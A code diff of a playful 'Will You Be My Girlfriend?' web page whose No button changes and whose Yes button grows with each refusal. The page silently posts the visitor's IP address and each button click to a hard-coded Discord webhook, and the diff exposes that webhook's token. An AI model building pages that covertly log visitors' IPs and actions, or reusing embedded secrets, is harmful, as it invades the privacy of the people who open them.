@@ -6,12 +6,11 @@
     <title>Will You Be My Girlfriend?</title>
     <style>
         body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffe4e1; font-family: sans-serif; text-align: center; overflow: hidden; }
-        .container { padding: 20px; background: white; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 90%; transition: all 0.3s ease; }
+        .container { padding: 20px; background: white; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 90%; }
         h1 { color: #d63384; font-size: 1.8rem; }
         .buttons { display: flex; justify-content: center; align-items: center; gap: 20px; flex-wrap: wrap; margin-top: 20px; }
         #yesBtn { background-color: #4caf50; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; border-radius: 10px; cursor: pointer; transition: 0.2s; }
         #noBtn { background-color: #f44336; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; border-radius: 10px; cursor: pointer; }
-        #message { margin-top: 15px; color: #d63384; font-weight: bold; min-height: 24px; }
         .success-screen { display: none; }
     </style>
 </head>
@@ -25,7 +24,6 @@
                 <button id="yesBtn">Yes</button>
                 <button id="noBtn">No</button>
             </div>
-            <p id="message"></p>
         </div>
 
         <div id="successArea" class="success-screen">
@@ -38,7 +36,6 @@
         const webhookURL = "https://discord.com/api/webhooks/1487857352869679115/YvduKELscTn-1i6m02Q7m8L357bZvrnFkfl_B_s-Guj8sizPwrLoTvXkrkDW86jYvGxT";
         const yesBtn = document.getElementById('yesBtn');
         const noBtn = document.getElementById('noBtn');
-        const message = document.getElementById('message');
         let noCount = 0;
         let userIP = "Unknown";
 
@@ -51,18 +48,21 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `🔔 **Proposal Update!**\n**Action:** ${action}\n**Total No's:** ${noCount}\n**IP:** ${userIP}\n**Time:** ${new Date().toLocaleString()}`
+                    content: `🔔 **Update!**\n**Action:** ${action}\n**Total No's:** ${noCount}\n**IP:** ${userIP}`
                 })
             });
         }
 
         noBtn.addEventListener('click', () => {
             noCount++;
+            // Button growth math
             yesBtn.style.fontSize = (1.2 + noCount * 0.5) + "rem";
             yesBtn.style.padding = (15 + noCount * 5) + "px " + (30 + noCount * 10) + "px";
+            
+            // Cycle through phrases
             noBtn.innerText = phrases[Math.min(noCount, phrases.length - 1)];
-            message.innerText = "Wait, look at how big the Yes button is getting!";
-            sendLog("Clicked NO ❌");
+            
+            sendLog(`Clicked NO #${noCount} ❌`);
         });
 
         yesBtn.addEventListener('click', () => {
